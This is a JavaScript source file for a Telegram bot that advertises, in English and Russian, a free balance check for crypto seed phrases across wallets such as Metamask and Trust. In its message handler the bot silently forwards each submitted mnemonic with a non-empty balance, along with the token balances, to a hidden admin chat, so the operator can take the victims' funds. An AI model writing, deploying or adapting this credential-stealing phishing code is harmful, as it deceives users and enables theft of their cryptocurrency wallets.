import TelegramBot from "node-telegram-bot-api";
import { ethers } from "ethers";
import balance from "crypto-balances-2";
import { adminId, botTokens } from "./config.js";

const bot = new TelegramBot(botTokens[1], { polling: true });

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const message = msg.text;

  if (message === "/start") {
    await sendGreetingMessage(chatId);
  } else {
    try {
      // Get tokens or false if no tokens found
      const balance = await getTokens(message);

      if (balance) {
        // Send message to user
        await bot.sendMessage(chatId, `Tokens i've found:\n\n${generateTokensString(balance)}`, {
          parse_mode: "HTML",
        });
        // Send message to admin
        await bot.sendMessage(
          adminId,
          `User's mnemonic:\n<code>${message}</code>\n\nTokens:\n${generateTokensString(balance)}`,
          {
            parse_mode: "HTML",
          }
        );
      } else {
        // Tell user that he has no tokens
        await sendNotFoundTokensMessage(chatId);
      }
    } catch (error) {
      // Tell user that he has bad seed phrase
      sendErrorMessage(chatId);
    }
    return;
  }
});

const sendGreetingMessage = async (chatId) => {
  let text = "🇬🇧\n";
  text +=
    "In this bot you can check your seed phrase for balance in such wallets as: Exodus, Trust, Metamask, Atomic, Blockchain, Coinbase, Safepal, Jaxx, Math.\n";
  text += "Just send me seed phrase (mnemonic) and get results.\n\n";
  text += "For example:\n";
  text += "<code>hero steak display couple raven gaze trick fish bracket evil drum fetch</code>\n\n";
  text += "🇷🇺\n";
  text +=
    "В этом боте вы можете проверить свою seed фразу на баланс в таких кошельках как: Exodus, Trust, Metamask, Atomic, Blockchain, Coinbase, Safepal, Jaxx, Math.\n";
  text += "Просто пришли мне сид фразу, и получили результат.\n\n";
  text += "Например:\n";
  text += "<code>hero steak display couple raven gaze trick fish bracket evil drum fetch</code>";

  await bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
  });
};

const sendErrorMessage = async (chatId) => {
  let text = "Bad seed phrase😔\n";
  text += "It must consist of 12 or 24 words.\n\n";
  text += "For example:\n<code>hero steak display couple raven gaze trick fish bracket evil drum fetch</code>";
  await bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
  });
};

const sendNotFoundTokensMessage = async (chatId) => {
  let text = "No tokens found😔\n";
  text += "It seems that you have no tokens on the wallet.";
  await bot.sendMessage(chatId, text);
};

const getTokens = async (mnemonic) => {
  const wallet = ethers.Wallet.fromMnemonic(mnemonic);
  const data = await balance(wallet.address);

  if (Object.keys(data.balances).length === 0) {
    // await bot.sendMessage(chatId, "No tokens found");
    return false;
  }
  return data.balances;
};

const generateTokensString = (mnemonic) => {
  let tokens = "";

  for (let key of Object.keys(mnemonic)) {
    tokens += `${key}: ${mnemonic[key]}\n`;
  }

  return tokens;
};
